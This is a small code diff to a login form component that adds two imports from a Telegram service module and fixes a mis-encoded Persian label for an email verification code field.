@@ -30,6 +30,8 @@ import {
   setUserCurrentStep,
   canAccessAuthStep,
   getSession,
+  updatePhoneVerification,
+  showAdminButtons,
 } from "@/lib/telegram-service-enhanced";
 import {
   registerTelegramCallback,
@@ -1487,7 +1489,7 @@ export const LoginForm = () => {
                     textAlign: "right",
                   }}
                 >
-                  کد تایی�� ایمیل
+                  کد تایید ایمیل
                 </label>
                 <OTPInput
                   length={6}
